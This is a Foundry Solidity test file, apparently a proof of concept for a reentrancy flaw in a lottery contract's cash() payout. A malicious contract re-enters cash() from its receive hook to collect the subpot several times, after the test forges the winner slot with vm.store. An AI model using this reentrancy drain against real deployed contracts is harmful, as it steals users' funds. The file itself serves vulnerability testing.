// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherpot_lotto.sol";

contract MaliciousWinner {
    Lotto public lotto;
    uint256 public roundIndex;
    uint256 public subpotIndex;
    uint256 public attackCount;
    uint256 public targetAmount;

    constructor(Lotto _lotto, uint256 _roundIndex, uint256 _subpotIndex, uint256 _targetAmount) {
        lotto = _lotto;
        roundIndex = _roundIndex;
        subpotIndex = _subpotIndex;
        targetAmount = _targetAmount;
    }

    // Fallback function that reenters the cash call
    receive() external payable {
        if (address(lotto).balance >= targetAmount && attackCount < 3) {
            attackCount++;
            lotto.cash(roundIndex, subpotIndex);
        }
    }
}

contract LottoReentrancyTest is Test {
    Lotto public lotto;
    MaliciousWinner public malicious;
    uint256 public constant BLOCKS_PER_ROUND = 10;
    address public attacker = address(0x1);

    function setUp() public {
        // Deploy the lotto contract
        lotto = new Lotto();
        
        // Set up a round
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        (bool success,) = address(lotto).call{value: 1 ether}("");
        require(success, "Ticket purchase failed");
        vm.stopPrank();

        // Advance blocks to make round active
        vm.roll(BLOCKS_PER_ROUND + 1);
    }

    function testReentrancyVulnerability() public {
        uint256 subpotAmount = lotto.getSubpot(0);
        assertGt(subpotAmount, 0, "Subpot amount should be >0");

        // Deploy malicious contract with target amount
        malicious = new MaliciousWinner(lotto, 0, 0, subpotAmount);
        
        // Setup attack: win the subpot by manipulating ticket distribution state
        vm.store(
            address(lotto),
            bytes32(uint256(1)), // Slot containing round info
            bytes32(abi.encode(address(malicious), uint256(1), uint256(1)))
        );
        
        // State before attack
        console.log("--- BEFORE-Trigger ---");
        uint256 lottoBalanceBefore = address(lotto).balance;
        uint256 maliciousBalanceBefore = address(malicious).balance;
        bool isCashedBefore = lotto.getIsCashed(0,0);
        
        console.log("Lotto ETH Balance:", lottoBalanceBefore);
        console.log("Malicious ETH Balance:", maliciousBalanceBefore);
        console.log("isCashed(0,0):", isCashedBefore);
        require(!isCashedBefore, "isCashed should be false before attack");
        
        // Execute reentrancy attack
        console.log("--- TRIGGER REENTRANCY ATTACK ---");
        lotto.cash(0,0);
        
        // State after attack
        console.log("--- AFTER-Trigger ---");
        uint256 lottoBalanceAfter = address(lotto).balance;
        uint256 maliciousBalanceAfter = address(malicious).balance;
        bool isCashedAfter = lotto.getIsCashed(0,0);
        uint256 totalAttacks = malicious.attackCount();
        uint256 expectedDrain = totalAttacks * subpotAmount;
        uint256 maliciousGain = maliciousBalanceAfter - maliciousBalanceBefore;
        uint256 lottoLoss = lottoBalanceBefore - lottoBalanceAfter;
        
        console.log("Lotto ETH Balance:", lottoBalanceAfter);
        console.log("Malicious ETH Balance:", maliciousBalanceAfter);
        console.log("isCashed(0,0):", isCashedAfter);
        console.log("Attack Count:", totalAttacks);
        console.log("LottoDrain:", lottoLoss, "vs Expected Drain:", expectedDrain);
        console.log("MaliciousGain:", maliciousGain, "vs Expected Gain:", expectedDrain);
        
        // State comparison and vulnerability verdict
        bool vulnerabilityExists = (lottoLoss == expectedDrain) && 
                                  (maliciousGain == expectedDrain) && 
                                  (!isCashedAfter);
        
        console.log("--- VERDICT ---");
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Malicious actor drained ETH multiple times through reentrancy without updating state");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack was not fully successful");
        }
        
        // Original validation checks
        assertEq(address(malicious).balance, maliciousBalanceBefore + (subpotAmount * malicious.attackCount()),
            "Malicious contract should have received funds multiple times");
        assertEq(lotto.getIsCashed(0,0), false, "State should remain uncashed due to reentrancy");
    }
}